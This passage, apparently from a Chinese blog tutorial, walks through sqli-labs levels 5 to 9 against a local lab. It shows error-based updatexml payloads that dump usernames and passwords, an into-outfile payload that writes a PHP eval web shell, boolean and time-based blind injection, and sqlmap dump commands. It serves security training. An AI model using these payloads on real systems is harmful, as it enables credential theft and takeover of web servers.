1</span><br></pre></td></tr></table></figure><p>去掉用于引用报错信息的单引号<code>&#39;-1\&#39; LIMIT 0,1</code> 我们可以知道，此时的sql语句是用单引号闭合的</p><h3 id="判断字段数-4"><a href="#判断字段数-4" class="headerlink" title="判断字段数"></a>判断字段数</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; order by 3--+</span></span><br></pre></td></tr></table></figure><p><strong>结果:</strong></p><p><img src="Untitled%2053.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; order by 4--+</span></span><br></pre></td></tr></table></figure><p><strong>结果:可以判断字段数为3</strong></p><p><img src="Untitled%2054.png" alt="Untitled"></p><h3 id="判断回显位置-4"><a href="#判断回显位置-4" class="headerlink" title="判断回显位置"></a>判断回显位置</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：发现并没有回显，但是我们可以发现前面会有显示报错信息，因此我们可以采用报错注入</strong></p><p><img src="Untitled%2055.png" alt="Untitled"></p><h3 id="关于报错注入"><a href="#关于报错注入" class="headerlink" title="关于报错注入"></a><strong>关于报错注入</strong></h3><p>所谓的报错注入就是利用报错信息回显，把想要的结果显示在报错信息中</p><p>因此，使用<strong>报错注入的前提就是页面会显示报错信息</strong></p><p>就说说我最常用的一种报错注入的方式吧，其他的大家可以自行学习</p><p><strong>利用xpath语法错误注入</strong></p><ul><li>适用版本：mysql版本号大于5.1.5</li><li>从mysql5.1.5开始提供两个XML查询和修改的函数，extractvalue（）和updatexml（）</li><li>Extractvalue（）负责在xml文档中按照xpath语法查询节点内容</li><li>updatexml（）则负责修改查询到的内容</li><li>用法：这两个函数的第二个参数都要求是符合xpath语法的字符串，如果不满足要求就会报错，并且<strong>会把查询结果放在报错信息里</strong>。</li></ul><p>比如：</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select -1 and updatexml(1,concat(0x7e,database()),1)</span><br></pre></td></tr></table></figure><p><strong>结果：因为我们的第二个参数并不符合xpath语法的要求，所以产生报错执行第二个参数的语句</strong></p><p><img src="Untitled%2056.png" alt="Untitled"></p><p>所以这题我们就可以利用报错注入</p><h3 id="爆破数据库名-4"><a href="#爆破数据库名-4" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; and updatexml(1,concat(0x7e,database()),1) --+</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到数据库名security</strong></p><p><img src="Untitled%2057.png" alt="Untitled"></p><h3 id="爆破表名-4"><a href="#爆破表名-4" class="headerlink" title="爆破表名"></a>爆破表名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27;)),1) --+</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到表名emails,referers,uagents,users</strong></p><p><img src="Untitled%2058.png" alt="Untitled"></p><h3 id="爆破字段名-4"><a href="#爆破字段名-4" class="headerlink" title="爆破字段名"></a>爆破字段名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span><span class="built_in">users</span><span class="string">&#x27; and table_schema=&#x27;</span>security<span class="string">&#x27;)),1) --+</span></span><br></pre></td></tr></table></figure><p><strong>结果：成功得到字段名id,username,password</strong></p><p><img src="Untitled%2059.png" alt="Untitled"></p><h3 id="爆破数据-4"><a href="#爆破数据-4" class="headerlink" title="爆破数据"></a>爆破数据</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users)),1) --+</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到（部分）数据，其实与之前的数据相比就能看出来这次得到的数据是不完全的</strong></p><p><img src="Untitled%2060.png" alt="Untitled"></p><p><strong>那么为什么我们回显的数据不完全呢？</strong></p><p>因为updatexml() 函数和extractvalue()的报错内容长度不能超过 32 个字符，所以需要我们对结果进行处理，可以让我们多次拿出我们想要的数据</p><p><strong>我们应该如何处理？</strong></p><p>可以使用mid(),left(),substring()函数来对结果字符串进行处理，这里以substring进行演示</p><h3 id="关于substring"><a href="#关于substring" class="headerlink" title="关于substring"></a>关于substring</h3><p><strong>SUBSTRING ( expression, start, length )</strong></p><ul><li><strong>expression</strong><ul><li>字符串、二进制字符串、文本、图像、列或包含列的表达式。请勿使用包含聚合函数的表达式。</li></ul></li><li><strong>start</strong><ul><li>整数或可以隐式转换为 int 的表达式，指定子字符串的开始位置，索引是从1开始。</li></ul></li><li><strong>length</strong><ul><li>整数或可以隐式转换为 int 的表达式，指定子字符串的长度。经测试，暂且发现<strong>只能是非负数</strong></li></ul></li></ul><p>就拿我们当前的题目举例，给结果加上substring，我们现在只取第一个字符</p><p>也就是相应的应该为substring(xxx,1,1)，也就是将结果从第一位开始取，取1位</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; and updatexml(1,concat(0x7e,substring((select group_concat(username,0x7e,password) from users),1,1)),1) --+</span></span><br></pre></td></tr></table></figure><p><strong>结果：只有第一位字符D</strong></p><p><img src="Untitled%2061.png" alt="Untitled"></p><p>那么我们知道，报错信息只能输出32位，相当于以下语句</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; and updatexml(1,concat(0x7e,substring((select group_concat(username,0x7e,password) from users),1,32)),1) --+</span></span><br></pre></td></tr></table></figure><p><strong>结果：和不加这个substring是一样的</strong></p><p><img src="Untitled%2062.png" alt="Untitled"></p><p>而现在我们想要得到后面的数据，(因为我们<strong>前面还有一个0x7e</strong>，所以后面的字符只显示31位，也就是说默认显示的数据是<strong>（~+1-31位的数据）</strong>，前面的0x7e<strong>去掉也没问题</strong>)所以我们需要从第32位开始，只需要将开始位改为32即可，即substring(xxx,32,32)</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; and updatexml(1,concat(0x7e,substring((select group_concat(username,0x7e,password) from users),32,32)),1) --+</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到后面的部分结果，因此我们可以利用这个方法得到所有数据，后面不再演示，第五关结束</strong></p><p><img src="Untitled%2063.png" alt="Untitled"></p><h2 id="Less-6：GET-Double-injection-Double-Quotes-string"><a href="#Less-6：GET-Double-injection-Double-Quotes-string" class="headerlink" title="Less-6：GET -Double injection -Double Quotes -string"></a>Less-6：GET -Double injection -Double Quotes -string</h2><h3 id="界面-5"><a href="#界面-5" class="headerlink" title="界面"></a>界面</h3><p>在url中加入<code>?id=1</code> </p><p><img src="Untitled%2064.png" alt="Untitled"></p><p>在url中加入<code>?id=-1</code> </p><p><img src="Untitled%2065.png" alt="Untitled"></p><p>可以看到这次界面上依旧没有回显，基本可以确定不能使用联合查询注入</p><h3 id="判断注入点-5"><a href="#判断注入点-5" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>使用’或\来判断是否存在注入点</p><p><img src="Untitled%2066.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-6/?<span class="built_in">id</span>=-1\</span><br></pre></td></tr></table></figure><p><strong>报错信息：存在报错信息，说明可以使用报错注入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;&quot;-1\&quot; LIMIT 0,1&#x27;</span> at line 1</span><br></pre></td></tr></table></figure><p>去掉用于引用报错信息的单引号<code>&quot;-1\&quot; LIMIT 0,1</code> 我们可以知道，此时的sql语句是双引号闭合的</p><h3 id="爆破数据库名-5"><a href="#爆破数据库名-5" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot; and updatexml(1,concat(0x7e,database()),1) --+</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到数据库名security</strong></p><p><img src="Untitled%2067.png" alt="Untitled"></p><h3 id="爆破表名-5"><a href="#爆破表名-5" class="headerlink" title="爆破表名"></a>爆破表名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)),1) --+</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到表名emails,referers,uagents,users</strong></p><p><img src="Untitled%2068.png" alt="Untitled"></p><h3 id="爆破字段名-5"><a href="#爆破字段名-5" class="headerlink" title="爆破字段名"></a>爆破字段名</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;)),1) --+</span></span><br></pre></td></tr></table></figure><p><strong>结果：成功得到字段名id,username,password</strong></p><p><img src="Untitled%2069.png" alt="Untitled"></p><h3 id="爆破数据-5"><a href="#爆破数据-5" class="headerlink" title="爆破数据"></a>爆破数据</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&quot; and updatexml(1,concat(0x7e,substring((select group_concat(username,0x7e,password) from users),1,32)),1) --+</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到（部分）数据,第六关结束</strong></p><p><img src="Untitled%2070.png" alt="Untitled"></p><h1 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h1><h2 id="Less-7：GET-Dump-into-outfile-string"><a href="#Less-7：GET-Dump-into-outfile-string" class="headerlink" title="Less-7：GET -Dump into outfile -string"></a>Less-7：GET -Dump into outfile -string</h2><h3 id="界面-6"><a href="#界面-6" class="headerlink" title="界面"></a>界面</h3><p>在url中加入<code>?id=1</code> </p><p><img src="Untitled%2071.png" alt="Untitled"></p><p>在url中加入<code>?id=-1</code> </p><p><img src="Untitled%2072.png" alt="Untitled"></p><p>得到的基础信息是，无回显，无具体的报错信息，那么可能我们的联合查询注入和报错注入都不能使用</p><h3 id="判断注入点-6"><a href="#判断注入点-6" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>通过页面不同的反馈来判断注入点和闭合方式，我们知道如果未能将引号闭合时，会发生报错</p><p>也就是说若是闭合方式中有我们尝试的字符，就会报错，如果没有就不会报错。</p><p>而报错和不报错页面都在上面了，我们开始尝试</p><p><strong>先看最内层是单引号还是双引号</strong></p><p><strong>payload：单引号</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>结果：其实已经可以看出闭合方式中含有单引号了，我们继续试一下双引号</strong></p><p><img src="Untitled%2073.png" alt="Untitled"></p><p><strong>payload：双引号</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p><strong>结果：未报错，说明不含双引号</strong></p><p><img src="Untitled%2074.png" alt="Untitled"></p><p>此时我们判断出，闭合方式中含有单引号，我们假设只有单引号，加上<code>or 1=1 —+</code> 如果完全闭合将不会报错，若未完全闭合，就会报错</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; or 1=1 --+</span></span><br></pre></td></tr></table></figure><p><strong>结果：报错，说明未完全闭合</strong></p><p><img src="Untitled%2075.png" alt="Untitled"></p><p>我们继续尝试，直到不报错即可，最后判断出闭合方式为一个单引号和两个括号</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27;)) --+</span></span><br></pre></td></tr></table></figure><p><strong>结果：未报错，判断闭合方式成功</strong></p><p><img src="Untitled%2076.png" alt="Untitled"></p><p>但是，没有回显不能用联合注入，没有精确的报错信息无法使用报错注入，我们应该如何呢？</p><p>可以看到，不报错的页面有一个提示<code>Use outfile</code> ，我们可以联想到sql语句中的<strong>into outfile</strong></p><h3 id="关于into-outfile"><a href="#关于into-outfile" class="headerlink" title="关于into outfile"></a>关于<strong>into outfile</strong></h3><p><strong>sql语句中into outfile函数可以将文件导入到数据库的目录中</strong></p><p>在演示之前，我们需要知道完成<strong>into outfile</strong>操作需要满足三点要求</p><ul><li>1.具有root权限。</li><li>2.在数据库配置文件中的 配置项含有：secure_file_priv=’’。（注意在数据库中此项默认为secure_file_priv=null）</li><li>3.知道数据库的绝对路径。</li></ul><p>第一点，我们在搭建靶场时就是使用的root连接的数据库，所以第一点我们已经满足了</p><p>第二点我们需要手动修改，<strong>首先使用命令行连接mysql数据库</strong><br>如果没有添加环境变量可以到我们phpstudy的mysql文件位置</p><p><img src="Untitled%2077.png" alt="Untitled"></p><p>然后进入到bin目录下</p><p><img src="Untitled%2078.png" alt="Untitled"></p><p><code>shift+右键</code>打开命令行，输入密码连接数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure><p><img src="Untitled%2079.png" alt="Untitled"></p><p>查看secure_file_priv配置，如果为null则无法进行文件导出操作，默认为null</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="Untitled%2080.png" alt="Untitled"></p><p>打开<code>mysql</code>下的<code>my.ini</code></p><p><img src="Untitled%2081.png" alt="Untitled"></p><p>将<code>secure_file_priv=&quot;/&quot;</code>  添加到配置文件</p><p><img src="Untitled%2082.png" alt="Untitled"></p><p>此时重启mysql服务，然后再次查询，发现已经成功了，此时我们已经对C:\目录下的所有文件具有写入权限了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="Untitled%2083.png" alt="Untitled"></p><p>此时我们可以写入以下试试</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 into outfile <span class="string">&quot;C:\\phpStudy\\1.txt&quot;</span></span><br></pre></td></tr></table></figure><p><strong>结果：成功写入</strong></p><p><img src="Untitled%2084.png" alt="Untitled"></p><p><img src="Untitled%2085.png" alt="Untitled"></p><p>但是一般情况下，可以写入的目录不可能是整个C盘，一般只是在Mysql的目录下，或者其他特定目录比如phpStudy目录下的WWW目录。这就需要我们需要其他方式获得可以写入文件的路径</p><p>比如可以通过有回显的页面获取，我们可以去到less-1</p><p>使用查询<code>@@basedir,@@datadir</code> 来确定MySQL的基础目录和数据目录，</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27; union select 1,@@basedir,@@datadir--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：得到可写入目录<code>C:/phpStudy/MySQL/</code> 和<code>C:\phpStudy\MySQL\data\</code>，但一般能通过这种方式找到写入目录，我们也可以得到数据库中的其他数据，因此这种情形应用场景还是比较有限的，现在我们就模拟拥有对phpStudy的WWW目录的写入权限</strong></p><p><img src="Untitled%2086.png" alt="Untitled"></p><h3 id="写入木马"><a href="#写入木马" class="headerlink" title="写入木马"></a>写入木马</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27;)) union select 1,2,&quot;&lt;?php @eval($_POST[1]);?&gt;&quot; into outfile &quot;C:\\phpStudy\\WWW\\shell.php&quot;--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：报错,需要访问shell.php来确定写入是否成功</strong></p><p><img src="Untitled%2087.png" alt="Untitled"></p><p><strong>访问shell.php：</strong></p><p><strong>payload：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/shell.php</span><br></pre></td></tr></table></figure><p><strong>结果：写入成功</strong></p><p><img src="Untitled%2088.png" alt="Untitled"></p><h3 id="使用蚁剑连接木马"><a href="#使用蚁剑连接木马" class="headerlink" title="使用蚁剑连接木马"></a>使用蚁剑连接木马</h3><p>连接成功</p><p><img src="Untitled%2089.png" alt="Untitled"></p><p><strong>也可以利用此办法将数据写入这种可访问的文件</strong></p><h3 id="将数据写入可访问的文件"><a href="#将数据写入可访问的文件" class="headerlink" title="将数据写入可访问的文件"></a><strong>将数据写入可访问的文件</strong></h3><p><strong>payload：将数据写入result.txt</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=-1<span class="string">&#x27;)) union select 1,2,group_concat(username,0x7e,password)from users into outfile &quot;C:\\phpStudy\\WWW\\result.txt&quot;--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：访问result.txt，第七关结束</strong></p><p><img src="Untitled%2090.png" alt="Untitled"></p><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="Less-8：GET-Blind-Boolian-Based-single-Quotes"><a href="#Less-8：GET-Blind-Boolian-Based-single-Quotes" class="headerlink" title="Less-8：GET -Blind -Boolian Based -single Quotes"></a>Less-8：GET -Blind -Boolian Based -single Quotes</h2><h3 id="界面-7"><a href="#界面-7" class="headerlink" title="界面"></a>界面</h3><p>在url中加入<code>?id=1</code> </p><p><img src="Untitled%2091.png" alt="Untitled"></p><p>在url中加入<code>?id=-1</code> </p><p><img src="Untitled%2092.png" alt="Untitled"></p><p>没有回显，没有报错信息，但真和假条件的页面不同，可以采用盲注</p><h3 id="判断注入点-7"><a href="#判断注入点-7" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>使用’来判断是否存在注入点</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?<span class="built_in">id</span>=1<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>结果:报错说明其中含有单引号，注释掉后面的单引号，看是否报错</strong></p><p><img src="Untitled%2093.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-8/?<span class="built_in">id</span>=1<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p><strong>结果：不报错，说明闭合方式为单引号</strong></p><p><img src="Untitled%2094.png" alt="Untitled"></p><h3 id="爆破数据库名-6"><a href="#爆破数据库名-6" class="headerlink" title="爆破数据库名"></a>爆破数据库名</h3><p><strong>payload：and两端都为真，整体结果才为真</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27; and ascii(substring((select database()),1,1))&gt;1--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：可以真假页面显示的不同来判断我们构造的条件是否正确，</strong><code>scii(substring((select database()),1,1))&gt;1</code> 为真</p><p><img src="Untitled%2095.png" alt="Untitled"></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?<span class="built_in">id</span>=1<span class="string">&#x27; and ascii(substring((select database()),1,1))&gt;128--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：</strong><code>ascii(substring((select database()),1,1))&gt;128--+</code> 为假</p><p><img src="Untitled%2096.png" alt="Untitled"></p><p>我们可以使用这种方式并结合<strong>二分法</strong>来快速猜取数据库名，表名等</p><p>最终得到数据库名为<strong>security</strong></p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and (select database())=&quot;security&quot;--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：数据库名为security</strong></p><p><img src="Untitled%2097.png" alt="Untitled"></p><p>当然，这种方法还是有些麻烦，我们可以借助工具和脚本来完成，这里演示一下使用<strong><code>sqlmap</code></strong>进行爆破</p><h3 id="使用Sqlmap进行GET类型注入"><a href="#使用Sqlmap进行GET类型注入" class="headerlink" title="使用Sqlmap进行GET类型注入"></a>使用Sqlmap进行GET类型注入</h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-8/?<span class="built_in">id</span>=1 </span><br></pre></td></tr></table></figure><ul><li>-u 表示要进行注入的地方</li></ul><p><strong>结果：得到此get注入的存在的注入类型为布尔盲注</strong></p><p><img src="Untitled%2098.png" alt="Untitled"></p><h3 id="使用Sqlmap爆破数据库名称"><a href="#使用Sqlmap爆破数据库名称" class="headerlink" title="使用Sqlmap爆破数据库名称"></a>使用Sqlmap爆破数据库名称</h3><p><strong>payload：在刚刚的基础上加入—dbs/—current-db</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-8/?<span class="built_in">id</span>=1 --dbs</span><br></pre></td></tr></table></figure><ul><li>—dbs 对所有数据库名称进行爆破</li><li>—current-db对当前使用数据库机型爆破</li></ul><p><strong>结果：得到数据库名security</strong></p><p><img src="Untitled%2099.png" alt="Untitled"></p><h3 id="使用Sqlmap爆破表名称"><a href="#使用Sqlmap爆破表名称" class="headerlink" title="使用Sqlmap爆破表名称"></a><strong>使用Sqlmap爆破表名称</strong></h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-8/?<span class="built_in">id</span>=1 -D security --tables</span><br></pre></td></tr></table></figure><ul><li>-D 指定数据库</li><li>—tables 对表名进行爆破</li></ul><p><strong>结果：得到表名users</strong></p><p><img src="Untitled%20100.png" alt="Untitled"></p><h3 id="使用Sqlmap爆破字段名称"><a href="#使用Sqlmap爆破字段名称" class="headerlink" title="使用Sqlmap爆破字段名称"></a><strong>使用Sqlmap爆破字段名称</strong></h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-8/?<span class="built_in">id</span>=1 -D security -T <span class="built_in">users</span> --columns</span><br></pre></td></tr></table></figure><ul><li>-T 指定表名</li><li>—columns 对字段名进行爆破</li></ul><p><strong>结果：得到字段名</strong></p><p><img src="Untitled%20101.png" alt="Untitled"></p><h3 id="使用Sqlmap爆破数据"><a href="#使用Sqlmap爆破数据" class="headerlink" title="使用Sqlmap爆破数据"></a><strong>使用Sqlmap爆破数据</strong></h3><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.199.128/sqli/Less-8/?<span class="built_in">id</span>=1 -D security -T <span class="built_in">users</span> --dump --threads 10</span><br></pre></td></tr></table></figure><ul><li>—dump 对数据进行爆破</li><li>—threads 10 使用十线程当数据较多时增加线程可以加快速度</li></ul><p><strong>结果：得到数据，第八关结束</strong></p><p><img src="Untitled%20102.png" alt="Untitled"></p><h2 id="Less-9：GET-Blind-Time-based-single-Quotes"><a href="#Less-9：GET-Blind-Time-based-single-Quotes" class="headerlink" title="Less-9：GET - Blind  Time based - single Quotes"></a>Less-9：GET - Blind  Time based - single Quotes</h2><h3 id="界面-8"><a href="#界面-8" class="headerlink" title="界面"></a>界面</h3><p>在url中加入<code>?id=1</code> </p><p><img src="Untitled%20103.png" alt="Untitled"></p><p>在url中加入<code>?id=-1</code> </p><p><img src="Untitled%20104.png" alt="Untitled"></p><p>我们其实可以知道，当数据库没有一个数据的时候，应当会报错或是页面应该和查到一个数据的时候不同，我们的布尔盲注就是利用如此原理，但此时我们发现无论输入的id正确与否，<strong>页面都未发生改变</strong>，又无回显也没有报错信息，因此此时可以使用<strong>时间盲注</strong></p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>布尔盲注时根据页面的变化作为参照让我们知道我们构造的条件是否正确，而当页面没有变化时，我们仍需要一个参照来确认我们构造的条件是否正确</p><p><strong>用什么作为参照？</strong></p><p>没错，就是<strong>时间</strong>，在sql中有一个函数为<strong>sleep(n)</strong>可以将程序挂起n秒钟，并且搭配<strong>if(1，2，3)，</strong>达到当我们构造的条件为真时，就进行睡眠。为假时就不做操作的效果</p><p><strong>函数及效果</strong></p><ul><li>if(1,2,3)  1处为条件，为真时执行2处语句，为假时执行3处语句</li><li>sleep(n)  将程序挂起n秒钟</li></ul><h3 id="判断注入点-8"><a href="#判断注入点-8" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>使用各种符号加上 and sleep(3)—+来判断闭合方式，需要保持and前的条件为真</p><p><strong>payload</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=1<span class="string">&#x27; and sleep(3)--+</span></span><br></pre></td></tr></table></figure><p><strong>结果：页面挂起将近三秒sleep正确执行，闭合方式为单引号</strong></p><p>页面延迟近3秒</p><p><img src="Untitled%20105.png" alt="Untitled"></p><p>也可以在<code>F12</code>的开发者工具中的<code>网络</code>中看到延迟</p><p><img src="Untitled%20106.png" alt="Untitled"></p><h3 id="关于and和or的使用"><a href="#关于and和or的使用" class="headerlink" title="关于and和or的使用"></a>关于and和or的使用</h3><p><strong>那么为什么要使用and，而不用or呢？</strong></p><p>在此之前我们需要知道and和or的执行特性</p><p>我们都知道and只有在两边的条件都为真的时候，整体才为真</p><p><strong>那么当第一个条件为假的时候，我们的第二个条件还会执行么？</strong></p><p>我们可以在数据库中验证一下</p><p><strong>payload：如果第一个条件为假变不会执行第二个，那么我们的程序便不会挂起，反之，挂起将近3s</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="literal">false</span> and <span class="built_in">sleep</span>(3);</span><br></pre></td></tr></table></figure><p><strong>结果：未挂起，说明在and中第一个条件为假时不会执行第二个，我们可以构造一条第一个条件为真时执行并判断第二个条件的sql语句来验证这个结论</strong></p><p><img src="Untitled%20107.png" alt="Untitled"></p><p><strong>payload：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="literal">true</span> and <span class="built_in">sleep</span>(3);</span><br></pre></td></tr></table></figure><p><strong>结果：挂起三秒后显示结果，验证了上一个结论，并且说明在and中当第一个条件为真时会继续运行并验证第二个条件</strong></p><p><img src="Untitled%20108.png" alt="Untitled"></p><p><strong>由and的特性来说，最终结果为0，也就是假，说明sleep()的返回值为假</strong></p><p><img src="Untitled%20109.png" 